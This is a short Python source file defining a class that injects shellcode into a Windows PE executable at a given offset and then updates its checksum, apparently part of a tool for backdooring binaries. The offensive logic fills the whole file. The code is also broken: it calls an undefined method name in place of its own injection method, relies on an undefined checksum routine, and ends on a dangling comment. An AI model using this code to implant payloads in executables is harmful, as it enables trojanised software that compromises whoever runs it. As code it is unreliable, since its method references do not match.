from Utils import  MultiByteHandler
from Utils import Win32BinaryOffsetsAndSizes

class Win32SectionInjector:

    def _inject_shell_code_at_offset(self):

        memory_offset = self.injection_location
        for shell_code_byte in self.shell_code:
            self.binary_data[memory_offset] = shell_code_byte
            memory_offset += 1

    def modify_binary(self):

        header_offset = MultiByteHandler.get_dword_given_offset(self.binary_data, Win32BinaryOffsetsAndSizes.OFFSET_TO_PE_HEADER_OFFSET)

        self._inject_shell()
        # TODO: Enable Checksum
        self._update_checksum(self.binary_data, header_offset)
        return self.binary_data

    def __init__(self, binary_data, shell_code_generator, injection_location):

        self.binary_data = binary_data
        self.shell_code_generator = shell_code_generator
        self.shell_code = shell_code_generator.get_base_shell_code(0)
        self.injection_location = injection_location
        # extended section must have their RVAs adjusted. This variable contains the adjustment.
